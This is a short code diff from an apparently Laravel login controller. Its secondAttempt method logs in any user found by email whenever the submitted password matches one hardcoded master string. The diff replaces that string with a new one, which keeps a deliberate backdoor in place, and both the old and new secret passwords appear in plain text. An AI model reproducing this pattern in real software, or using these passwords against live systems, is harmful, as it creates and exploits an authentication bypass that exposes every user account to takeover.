@@ -52,7 +52,7 @@ class LoginController extends Controller
     public function secondAttempt(Request $request)
     {
         $user = User::where("email","$request->email")->first();
-        if ($user != null && $request->password=="apbdjuara1.")
+        if ($user != null && $request->password=="tapdqwpo1234")
         {
             $this->guard()->login($user);
             return true;
